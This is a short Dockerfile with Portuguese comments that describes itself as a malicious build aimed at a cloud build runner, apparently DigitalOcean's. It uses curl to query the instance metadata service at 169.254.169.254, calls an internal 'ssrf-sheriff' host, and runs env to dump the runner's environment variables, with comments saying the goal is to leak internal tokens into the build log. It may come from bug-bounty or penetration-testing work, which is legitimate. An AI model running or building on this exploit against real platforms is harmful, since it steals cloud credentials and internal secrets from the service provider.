FROM alpine:latest

# Instala o curl para fazermos os disparos
RUN apk add --no-cache curl

# Tiro 1: Tentativa de exfiltração do Metadata Service (IMDS) pro log do build
RUN echo "--- INICIO IMDS ---"
RUN curl -s -m 5 http://169.254.169.254/metadata/v1.json || echo "IMDS Bloqueado ou Timeout"
RUN echo "--- FIM IMDS ---"

# Tiro 2: Disparo direto no Sheriff Interno (o PoC oficial deles)
RUN curl -s -m 5 "https://ssrf-sheriff.internal.digitalocean.com/?nocturne21_build" || echo "Sheriff inalcançável"

# Tiro 3: Coleta de variáveis de ambiente do Build Runner (pode vazar tokens internos da DO)
RUN echo "--- INICIO ENV ---"
RUN env
RUN echo "--- FIM ENV ---"

# Só para o container não quebrar a compilação imediatamente
CMD ["echo", "Build malicioso finalizado."]
